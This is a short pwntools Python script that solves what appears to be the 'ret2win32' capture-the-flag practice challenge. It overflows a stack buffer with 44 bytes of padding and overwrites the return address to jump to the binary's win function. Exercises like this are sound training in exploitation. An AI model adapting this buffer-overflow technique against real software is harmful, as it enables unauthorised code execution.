#!/usr/bin/python
from pwn import *

def main():
    junk = "A" * 44			# EIP Offset at 44
    ret2win_addr = p32(0x08048659)	# Objdump -d ret2win32 | grep ret2win
    p = process("./ret2win32")
    payload = junk + ret2win_addr

    p.sendlineafter(">", payload)
    print p.recvall()

if __name__ == "__main__":
    main()
